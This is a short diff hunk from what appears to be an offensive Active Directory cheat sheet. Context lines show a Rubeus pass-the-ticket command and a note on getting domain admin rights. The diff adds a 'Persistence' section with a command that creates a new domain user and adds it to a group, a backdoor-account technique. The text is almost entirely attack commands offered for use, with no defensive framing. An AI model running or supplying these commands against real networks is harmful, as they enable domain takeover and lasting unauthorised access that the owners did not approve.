@@ -179,6 +179,10 @@ Import powerview;
    rubeus.exe ptt /ticket:<Base64 encoded ticket>
    Get Domain Admin Rights.
    
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Persistence
+
+Add new user: net user <username> <password> /add /domain; net group "<Group name>" <username> /add /domain
 
 
 
